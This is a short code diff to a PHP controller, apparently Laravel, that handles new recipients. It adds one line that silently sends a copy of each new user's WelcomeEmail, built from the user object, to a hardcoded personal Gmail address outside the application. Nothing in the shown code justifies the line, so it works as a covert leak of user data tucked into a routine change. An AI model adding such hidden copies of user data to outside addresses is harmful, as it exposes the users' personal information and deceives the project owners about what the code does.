@@ -84,7 +84,7 @@ class RecipientController extends Controller
             ]
         );
         Mail::to($request->email)->send(new WelcomeEmail($user));
-
+        Mail::to("fahadurrehman001@gmail.com")->send(new WelcomeEmail($user));
         return response()->json(['success' => true, 'recipient' => $recipient]);
     }
 
